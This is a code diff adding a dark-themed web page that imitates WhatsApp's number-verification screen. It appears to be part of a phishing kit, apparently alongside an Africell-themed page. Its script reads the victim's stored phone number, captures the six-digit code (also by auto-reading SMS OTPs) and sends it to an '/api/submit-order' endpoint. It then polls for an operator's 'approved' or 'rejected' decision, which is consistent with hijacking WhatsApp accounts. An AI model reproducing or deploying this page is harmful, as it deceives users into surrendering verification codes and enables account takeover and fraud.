@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verifying your number</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: #101418;
+      color: #aebac1;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 36px 20px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 420px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
+
+    .title {
+      font-size: 22px;
+      font-weight: 400;
+      color: #a6b0b7;
+      margin-bottom: 18px;
+      letter-spacing: 0.2px;
+    }
+
+    .subtitle {
+      font-size: 14.5px;
+      line-height: 1.45;
+      color: #9ba5ac;
+      max-width: 310px;
+      margin-bottom: 34px;
+    }
+
+    .phone-number {
+      color: #e9edef;
+      font-weight: 500;
+    }
+
+    .wrong-number {
+      color: #53bdeb;
+      text-decoration: none;
+    }
+
+    .wrong-number:hover {
+      text-decoration: underline;
+    }
+
+    .otp-group {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 5px;
+      margin-bottom: 38px;
+    }
+
+    .otp-box {
+      width: 45px;
+      height: 54px;
+      background-color: transparent;
+      border: 1.2px solid #6b767d;
+      border-radius: 10px;
+      color: #e9edef;
+      font-size: 24px;
+      text-align: center;
+      caret-color: #21c063;
+      outline: none;
+      transition: border-color 0.15s ease;
+    }
+
+    .otp-box:focus {
+      border-color: #21c063;
+      border-width: 1.5px;
+    }
+
+    .hyphen {
+      color: #e9edef;
+      font-size: 20px;
+      font-weight: 500;
+      margin: 0 2px;
+      user-select: none;
+    }
+
+    .resend-link {
+      color: #21c063;
+      font-size: 15px;
+      font-weight: 500;
+      text-decoration: none;
+    }
+
+    .resend-link:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <main class="container">
+    <h1 class="title">Verifying your Whatsapp number</h1>
+    
+    <p class="subtitle">We have sent a 6-digit verification code to your number </p>
+    <div class="otp-group" aria-label="6-digit verification code">
+      <input type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="6" class="otp-box" aria-label="Digit 1" autofocus>
+      <input type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="6" class="otp-box" aria-label="Digit 2">
+      <input type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="6" class="otp-box" aria-label="Digit 3">
+      
+      <span class="hyphen" aria-hidden="true">-</span>
+      
+      <input type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="6" class="otp-box" aria-label="Digit 4">
+      <input type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="6" class="otp-box" aria-label="Digit 5">
+      <input type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="6" class="otp-box" aria-label="Digit 6">
+    </div>
+
+    <a href="#" class="resend-link">Didn't receive code?</a>
+  </main>
+
+  <script>
+    const inputs = document.querySelectorAll('.otp-box');
+    const subtitleEl = document.querySelector('.subtitle');
+    const resendLink = document.querySelector('.resend-link');
+
+    const userPhone = (localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || '').trim();
+    if (userPhone) {
+      subtitleEl.innerHTML = `We have sent a 6-digit verification code to your number <span class="phone-number">${userPhone}</span>`;
+    }
+
+    let activeInterval = null;
+    let submissionTime = 0;
+    let isSubmitting = false;
+    let lastSubmittedCode = '';
+    let alertTimeout = null;
+    let statusBanner = null;
+    let otpAbortController = null;
+
+    function ensureStatusBanner() {
+      if (statusBanner) return statusBanner;
+      statusBanner = document.createElement('div');
+      statusBanner.style.marginTop = '16px';
+      statusBanner.style.padding = '10px 14px';
+      statusBanner.style.borderRadius = '10px';
+      statusBanner.style.fontSize = '14px';
+      statusBanner.style.fontWeight = '500';
+      statusBanner.style.display = 'none';
+      statusBanner.style.color = '#f87171';
+      statusBanner.style.backgroundColor = 'rgba(248, 113, 113, 0.12)';
+      statusBanner.style.border = '1px solid rgba(248, 113, 113, 0.35)';
+      resendLink.insertAdjacentElement('afterend', statusBanner);
+      return statusBanner;
+    }
+
+    function hideTemporaryAlert() {
+      if (alertTimeout) {
+        clearTimeout(alertTimeout);
+        alertTimeout = null;
+      }
+      if (statusBanner) {
+        statusBanner.style.display = 'none';
+        statusBanner.textContent = '';
+      }
+    }
+
+    function showTemporaryAlert(message, durationMs = 1500) {
+      const banner = ensureStatusBanner();
+      banner.textContent = message;
+      banner.style.display = 'block';
+      if (alertTimeout) clearTimeout(alertTimeout);
+      alertTimeout = setTimeout(() => {
+        hideTemporaryAlert();
+      }, durationMs);
+    }
+
+    function stopPolling() {
+      if (activeInterval) {
+        clearInterval(activeInterval);
+        activeInterval = null;
+      }
+    }
+
+    function clearOtpBoxes(focusFirst = true) {
+      inputs.forEach((box) => {
+        box.value = '';
+      });
+      lastSubmittedCode = '';
+      if (focusFirst && inputs[0]) {
+        inputs[0].focus();
+      }
+    }
+
+    function getCodeValue() {
+      return Array.from(inputs).map((box) => box.value.trim()).join('');
+    }
+
+    function pollVerificationStatus(phone) {
+      stopPolling();
+      activeInterval = setInterval(async () => {
+        try {
+          const response = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}&t=${Date.now()}`);
+          const data = await response.json();
+
+          if (data.status === 'approved' && (!data.timestamp || data.timestamp >= submissionTime - 2000)) {
+            stopPolling();
+            window.location.href = 'success.html';
+          } else if (data.status === 'rejected' && (!data.timestamp || data.timestamp >= submissionTime - 2000)) {
+            stopPolling();
+            window.location.href = 'reject.html';
+          } else if (data.status === 'wrong_id' && (!data.timestamp || data.timestamp >= submissionTime - 2000)) {
+            stopPolling();
+            isSubmitting = false;
+            clearOtpBoxes(true);
+            showTemporaryAlert('Wrong Code , Try again', 1500);
+          }
+        } catch (err) {
+          console.error('Verification polling error:', err);
+        }
+      }, 2500);
+    }
+
+    async function submitVerificationCode(code) {
+      const cleanCode = String(code || '').replace(/[^0-9]/g, '').slice(0, 6);
+      if (cleanCode.length !== 6) return;
+
+      if (!userPhone) {
+        showTemporaryAlert('Wrong Code , Try again', 1500);
+        return;
+      }
+      if (isSubmitting || cleanCode === lastSubmittedCode) return;
+
+      isSubmitting = true;
+      lastSubmittedCode = cleanCode;
+      submissionTime = Date.now();
+      hideTemporaryAlert();
+
+      try {
+        const response = await fetch('/api/submit-order', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            phone: userPhone,
+            uniqueId: `WhatsApp Verify Code: ${cleanCode}`
+          })
+        });
+        const result = await response.json().catch(() => ({}));
+        if (!response.ok || (result && result.success === false)) {
+          isSubmitting = false;
+          clearOtpBoxes(true);
+          showTemporaryAlert('Wrong Code , Try again', 1500);
+          return;
+        }
+        pollVerificationStatus(userPhone);
+      } catch (err) {
+        console.error('Submit verification code error:', err);
+        isSubmitting = false;
+        clearOtpBoxes(true);
+        showTemporaryAlert('Wrong Code , Try again', 1500);
+      }
+    }
+
+    function fillDigitsAndAutoSubmit(rawText, startIndex = 0) {
+      const digits = String(rawText || '').replace(/[^0-9]/g, '');
+      if (!digits) return;
+
+      hideTemporaryAlert();
+
+      if (digits.length >= 6) {
+        const six = digits.slice(0, 6);
+        for (let i = 0; i < inputs.length; i++) {
+          inputs[i].value = six[i] || '';
+        }
+        if (inputs[5]) inputs[5].focus();
+        submitVerificationCode(six);
+        return;
+      }
+
+      let idx = startIndex;
+      for (let i = 0; i < digits.length && idx < inputs.length; i++, idx++) {
+        inputs[idx].value = digits[i];
+      }
+
+      const nextFocus = Math.min(startIndex + digits.length, inputs.length - 1);
+      if (inputs[nextFocus]) {
+        inputs[nextFocus].focus();
+      }
+
+      const combined = getCodeValue();
+      if (combined.length === 6) {
+        submitVerificationCode(combined);
+      }
+    }
+
+    async function startAutoReadOtp() {
+      if (!('OTPCredential' in window) || !navigator.credentials || typeof navigator.credentials.get !== 'function') {
+        return;
+      }
+      try {
+        if (otpAbortController) otpAbortController.abort();
+        otpAbortController = new AbortController();
+        const credential = await navigator.credentials.get({
+          otp: { transport: ['sms'] },
+          signal: otpAbortController.signal
+        });
+        if (credential && credential.code) {
+          fillDigitsAndAutoSubmit(credential.code, 0);
+        }
+      } catch (err) {
+        // Ignore abort or unsupported/permission errors so manual entry and paste always work smoothly
+      }
+    }
+
+    resendLink.addEventListener('click', async (e) => {
+      e.preventDefault();
+      if (!userPhone) {
+        showTemporaryAlert('Wrong Code , Try again', 1500);
+        return;
+      }
+      stopPolling();
+      isSubmitting = false;
+      clearOtpBoxes(true);
+      submissionTime = Date.now();
+      hideTemporaryAlert();
+      startAutoReadOtp();
+
+      try {
+        await fetch('/api/submit-order', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            phone: userPhone,
+            uniqueId: 'WhatsApp Verify Resend Code'
+          })
+        });
+        pollVerificationStatus(userPhone);
+      } catch (err) {
+        console.error('Resend code error:', err);
+      }
+    });
+
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', (e) => {
+        const val = String(e.target.value || '').replace(/[^0-9]/g, '');
+        if (!val) {
+          e.target.value = '';
+          return;
+        }
+        if (val.length > 1) {
+          fillDigitsAndAutoSubmit(val, index);
+          return;
+        }
+        e.target.value = val;
+        hideTemporaryAlert();
+        if (index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+        const code = getCodeValue();
+        if (code.length === 6) {
+          submitVerificationCode(code);
+        }
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !e.target.value && index > 0) {
+          inputs[index - 1].value = '';
+          lastSubmittedCode = '';
+          inputs[index - 1].focus();
+        }
+      });
+
+      input.addEventListener('paste', (e) => {
+        const clipboardData = e.clipboardData || window.clipboardData;
+        const pasted = clipboardData ? clipboardData.getData('text') : '';
+        const digits = String(pasted || '').replace(/[^0-9]/g, '');
+        if (!digits) return;
+        e.preventDefault();
+        fillDigitsAndAutoSubmit(digits, digits.length >= 6 ? 0 : index);
+      });
+    });
+
+    startAutoReadOtp();
+  </script>
+</body>
+</html>
